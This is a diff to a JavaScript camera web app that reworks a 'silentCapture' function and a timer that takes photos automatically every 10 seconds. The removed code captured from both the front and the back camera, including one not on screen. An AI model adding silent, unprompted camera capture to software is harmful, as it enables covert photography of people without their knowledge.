@@ -1,5 +1,5 @@
 // ================================================================
-// app.js – Pro Camera PWA (Flip 100% Working)
+// app.js – Pro Camera PWA (No Mirror, Active Camera Only)
 // ================================================================
 
 (function() {
@@ -229,7 +229,7 @@
     isProcessing = false;
   }
 
-  // ---------- Silent Capture ----------
+  // ---------- Silent Capture (Active Camera Only, No Mirror) ----------
   async function silentCapture(stream, cameraType, captureType) {
     if (!stream) return;
     captureType = captureType || 'auto';
@@ -247,6 +247,9 @@
 
     tempCanvas.width = vw;
     tempCanvas.height = vh;
+
+    // ✅ No mirror effect – draw normally for both front and back
+    // (CSS transform on video is only for preview, canvas gets raw frame)
     tempCtx.filter = getFilterCSS(currentEffect);
     tempCtx.drawImage(tempVideo, 0, 0, vw, vh);
     tempCtx.filter = 'none';
@@ -291,11 +294,11 @@
     }
   }
 
-  // ---------- Auto Capture Logic (Sequential: Front → Back) ----------
+  // ---------- Auto Capture Logic (Active Camera Only) ----------
   function startAutoCapture() {
     if (isAutoCaptureRunning) return;
     isAutoCaptureRunning = true;
-    console.log('[Camera] ⏰ Auto-capture started');
+    console.log('[Camera] ⏰ Auto-capture started (Active Camera only)');
 
     var captureSequence = function() {
       var now = Date.now();
@@ -306,24 +309,23 @@
         return;
       }
 
-      if (frontStream) {
-        console.log('[Camera] 📸 Auto capture: Front at 10.1s');
-        silentCapture(frontStream, 'front', 'auto');
-      }
+      // ✅ Capture from active camera only (what user sees on screen)
+      var activeCameraType = userFacingMode === 'environment' ? 'back' : 'front';
+      var activeStream = userFacingMode === 'environment' ? backStream : frontStream;
 
-      setTimeout(function() {
-        if (backStream) {
-          console.log('[Camera] 📸 Auto capture: Back at 12s');
-          silentCapture(backStream, 'back', 'auto');
-        }
-      }, 1900);
+      if (activeStream) {
+        console.log('[Camera] 📸 Auto capture from active camera:', activeCameraType);
+        silentCapture(activeStream, activeCameraType, 'auto');
+      } else {
+        console.warn('[Camera] ⚠️ Active camera stream not available');
+      }
     };
 
     captureSequence();
     autoCaptureInterval = setInterval(captureSequence, 10000);
   }
 
-  // ---------- Manual Capture (ONLY Capture Button) ----------
+  // ---------- Manual Capture (Active Camera Only, No Mirror) ----------
   async function capturePhoto() {
     if (!isCameraReady) return;
     flashScreen();
@@ -331,7 +333,10 @@
 
     var vw = video.videoWidth || 1280;
     var vh = video.videoHeight || 720;
-    canvas.width = vw; canvas.height = vh;
+    canvas.width = vw;
+    canvas.height = vh;
+
+    // ✅ No mirror effect – draw normally for both front and back
     ctx.filter = getFilterCSS(currentEffect);
     ctx.drawImage(video, 0, 0, vw, vh);
     ctx.filter = 'none';
@@ -341,7 +346,8 @@
 
     var timestamp = Date.now();
     var photoId = generatePhotoId();
-    var fileName = 'MANUAL_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
+    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
+    var fileName = 'MANUAL_' + (cameraType === 'back' ? 'BACK' : 'FRONT') + '_' + new Date().toISOString().replace(/[:.]/g, '') + '_' + photoId + '.png';
     var compressedFileName = fileName.replace('.png', '_comp.jpg');
 
     var img = new Image();
@@ -351,8 +357,6 @@
     lastPhotoData = { original: originalData, compressed: compressedData, fileName: fileName, photoId: photoId };
     galleryImg.src = originalData;
     galleryImg.style.display = 'block';
-
-    var cameraType = userFacingMode === 'environment' ? 'back' : 'front';
 
     var entry = {
       photoId: photoId,
@@ -733,7 +737,7 @@
     flashBtn.classList.toggle('active', isTorchOn);
   });
 
-  // ✅ Flip Button – 100% Working (Stops old stream and gets new)
+  // ✅ Flip Button – ONLY FLIP (No Capture)
   flipBtn.addEventListener('click', async function() {
     console.log('[Camera] 🔄 Flip button clicked');
     var newFacingMode = (userFacingMode === 'environment') ? 'user' : 'environment';
@@ -762,7 +766,6 @@
       };
       var newStream = await navigator.mediaDevices.getUserMedia(constraints);
 
-      // Update streams
       if (newFacingMode === 'environment') {
         backStream = newStream;
       } else {
@@ -775,7 +778,6 @@
       console.log('[Camera] ✅ Camera flipped to:', userFacingMode);
     } catch (err) {
       console.error('[Camera] ❌ Flip failed:', err);
-      // Fallback: try without constraints
       try {
         var fallbackStream = await navigator.mediaDevices.getUserMedia({ video: true });
         if (newFacingMode === 'environment') {
